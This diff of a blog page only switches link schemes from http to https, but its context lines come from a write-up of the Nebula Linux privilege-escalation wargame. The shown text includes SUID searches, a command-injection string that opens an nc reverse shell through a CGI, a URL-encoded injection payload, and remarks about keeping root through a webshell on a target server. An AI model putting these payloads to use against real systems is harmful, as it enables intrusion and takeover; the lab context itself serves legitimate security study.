@@ -8,7 +8,7 @@
 <title>nebula系统学习</title>
 <meta name="description" content="A blog about programming and network security">
 
-<link rel="profile" href="http://gmpg.org/xfn/11" />
+<link rel="profile" href="https://gmpg.org/xfn/11" />
 <! -- link rel="stylesheet" href="//netdna.bootstrapcdn.com/bootstrap/3.1.1/css/bbbbootstrap.min.css"-- >
 <link rel="stylesheet" href="/css/my_code.css">
 <link rel="stylesheet" href="//netdna.bootstrapcdn.com/font-awesome/4.0.3/css/font-awesome.css">
@@ -16,7 +16,7 @@
 <link rel="stylesheet" type="text/css" media="all" href="/css/jquery.mmenu.all.css" />
 <link rel="stylesheet" href="/css/highlightjs.piperita.css">
 
-<!-- Favicons generated at http://realfavicongenerator.net/ -->
+<!-- Favicons generated at https://realfavicongenerator.net/ -->
 <link rel="apple-touch-icon" sizes="57x57" href="/favicons/apple-touch-icon-57x57.png">
 <link rel="apple-touch-icon" sizes="60x60" href="/favicons/apple-touch-icon-60x60.png">
 <link rel="apple-touch-icon" sizes="72x72" href="/favicons/apple-touch-icon-72x72.png">
@@ -69,7 +69,7 @@
     <br>
     <br>
     <br>
-    <!--http://fontawesome.io/icons/ -->
+    <!--https://fontawesome.io/icons/ -->
     <br>
     <center>
     <font color="red" align="center"><i class="fa fa-link" aria-hidden="true"></i><a href="../../../../../bookmarks.html"><font color="red"> link</font></a></font>
@@ -84,7 +84,7 @@
     <font color="red" align="center"><i class="fa fa-caret-square-o-right" aria-hidden="true"></i><a href="../../../../../mv.html" target="_top"><font color="red"> movie</font></a></font>
     </center>
     <p class="links">
-  <a href="http://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
+  <a href="https://www.twitter.com/quanyechavshuo" target="_new"><i class="fa fa-twitter"></i></a>
   <a href="https://github.com/3xp10it" target="_new"><i class="fa fa-github-alt"></i></a>
   <a href="/feed.xml" target="_new"><i class="fa fa-rss"></i></a>
 </p>
@@ -102,7 +102,7 @@
 <div class="container-fluid single">
   <div class="row">
 
-    <div itemscope itemtype="http://schema.org/Article" class="col-md-12 article">
+    <div itemscope itemtype="https://schema.org/Article" class="col-md-12 article">
       
 
       <h1 class="header" itemprop="name">nebula系统学习</h1>
@@ -140,11 +140,11 @@ Binary compilation failures
 At the end of Nebula, the user will have a reasonably thorough understanding of local attacks against Linux systems, and a cursory look at some of the remote attacks that are possible.
 
 official website:       https://exploit-exercises.com/nebula/
-nebula.iso download:    http://pan.baidu.com/s/1dFdRIm9
+nebula.iso download:    https://pan.baidu.com/s/1dFdRIm9
 some witeup:    
                         google--&gt;cache:https://lightless.me/archives/Nebula-writeup.html
                         or
-                        http://pan.baidu.com/s/1mhQgqCg
+                        https://pan.baidu.com/s/1mhQgqCg
                         or
                         https://github.com/join-us/exploit-exercises/blob/master/Nebula/level11.md
 </code></pre>
@@ -156,7 +156,7 @@ some witeup:
     pass:level00
     find / -type f -perm -4000 -ls &gt; tmp.txt
 link knowledge:
-    linux中suid,sgid,sticky详解:http://crazyming.blog.51cto.com/1048571/467414
+    linux中suid,sgid,sticky详解:https://crazyming.blog.51cto.com/1048571/467414
     find / -type f -perm -4000 -ls &gt; tmp.txt   function:find suid files
         find / -type f -perm -4000 -ls | grep "flag00" &gt; tmp.txt    function:find file has setuid=flag00
     find / -type f -perm -2000 -ls &gt; tmp.txt   function:find sgid files
@@ -259,7 +259,7 @@ link knowledge:
     *attention*:
     when I tried to keep root privilege in webshell,and conveniently execute commands in webshell but with root privilege(so I don't have to use reGeorg and proxycap and putty and upon two kinds of backdoor to connect target victim pc and execute commands with root shell,these actions are too slow to control target server),I tried to use root privilege to execute:
         chmod 4755 /..../..../webshell.php(eg.b374kshell)
-        browser visit--&gt;http://xxx/xxx/xxx/webshell.php ---&gt;  terminal:
+        browser visit--&gt;https://xxx/xxx/xxx/webshell.php ---&gt;  terminal:
         id
         out:auid=48(apache) gid=48(apache) groups=48(apache)
     later I realized a webshell.php file with setuid=root will not execute as root privilege,coz only executable files like elf,*.sh files will execute as root privilege,*.php file is not in the scope,so my webshell's terminal will has apache's privilege,not root,I could chmod 4755 apache to get root privilege in webshell.php,but it's not wise.
@@ -334,7 +334,7 @@ link knowledge:
     ctr+alt+f2 --&gt; tty2
     tty2:nc -lnv 8888
     ctr+alt+f1(backto tty1)
-    tty1:wget -O- "http://127.0.0.1:7007/index.cgi?Host=127.0.0 || mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc 127.0.0.1 8888 1&gt;/tmp/backpipe"
+    tty1:wget -O- "https://127.0.0.1:7007/index.cgi?Host=127.0.0 || mknod /tmp/backpipe p &amp;&amp; /bin/sh 0&lt;/tmp/backpipe | nc 127.0.0.1 8888 1&gt;/tmp/backpipe"
     ctr+alt+f2 --&gt; tty2
     tty2:id(flag07),getflag
 link knowledge:
@@ -411,7 +411,7 @@ link knowledge:
 <h4 id="x11-level11">0x11 level11</h4>
 <div class="highlighter-rouge"><pre class="highlight"><code>mykey:
     there are two ways:
-        (http://blackndoor.com/nebula-level11/)
+        (https://blackndoor.com/nebula-level11/)
         (https://github.com/join-us/exploit-exercises/blob/master/Nebula/level11.md)
 </code></pre>
 </div>
@@ -502,7 +502,7 @@ if __name__=='__main__':
     another terminal:
         nv -lv 1616
     origin terminal:
-        wget http://localhost:1616/index.cgi?username=%22%3C%2FDEV%2FNULL%3BP%3D%2FTMP%2FEXP.SH%3B%24{P%2C%2C}%3B%23&amp;password=
+        wget https://localhost:1616/index.cgi?username=%22%3C%2FDEV%2FNULL%3BP%3D%2FTMP%2FEXP.SH%3B%24{P%2C%2C}%3B%23&amp;password=
             urldecode:   "&lt;/DEV/NULL;P=/TMP/EXP.SH;${P,,};#
 </code></pre>
 </div>
@@ -564,7 +564,7 @@ if __name__=='__main__':
     vi /tmp/level18.out
 
 link knowledge:
-    http://v0ids3curity.blogspot.kr/2012/09/exploit-exercise-improper-file-handling.html
+    https://v0ids3curity.blogspot.kr/2012/09/exploit-exercise-improper-file-handling.html
 </code></pre>
 </div>
 
@@ -623,8 +623,8 @@ link knowledge:
             succeed
 
 link knowledge:
-    http://www.cnblogs.com/bastard/archive/2012/08/31/2664896.html
-    http://www.cnblogs.com/mydomain/archive/2011/09/27/2193247.html
+    https://www.cnblogs.com/bastard/archive/2012/08/31/2664896.html
+    https://www.cnblogs.com/mydomain/archive/2011/09/27/2193247.html
 </code></pre>
 </div>
 </span>
@@ -646,15 +646,15 @@ link knowledge:
       
       <div class="content-panel feedback">
         I <i class="fa fa-heart"></i> feedback.<br />
-        Let me know what you think of this article on twitter <a href="http://www.twitter.com/quanyechavshuo">@quanyechavshuo</a> or leave a comment below!
+        Let me know what you think of this article on twitter <a href="https://www.twitter.com/quanyechavshuo">@quanyechavshuo</a> or leave a comment below!
       </div>
       
 
       
       <div class="content-panel comments">
         <div id="disqus_thread">
-          <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
-          <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+          <a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
         </div>
       </div>
       
@@ -700,7 +700,7 @@ var disqus_shortname = "quanyechavshuo"; // required: replace example with your 
 <script src="//code.jquery.com/jquery-1.11.0.min.js"></script>
 <script src="//netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js"></script>
 <script src="/js/jquery.mmenu.min.all.js"></script>
-<script src="http://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/8.7/highlight.min.js"></script>
 <script>hljs.initHighlightingOnLoad();</script>
 <script type="text/javascript">
    $(document).ready(function() {
